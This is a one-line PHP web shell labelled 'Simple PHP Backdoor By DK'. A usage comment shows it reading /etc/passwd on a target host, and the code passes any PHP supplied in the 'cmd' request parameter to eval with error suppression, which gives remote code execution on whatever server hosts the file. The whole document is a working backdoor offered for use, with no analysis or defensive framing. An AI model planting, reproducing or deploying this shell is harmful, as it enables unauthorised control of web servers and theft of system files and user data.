<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); @eval($cmd); echo "</pre>"; die; }?>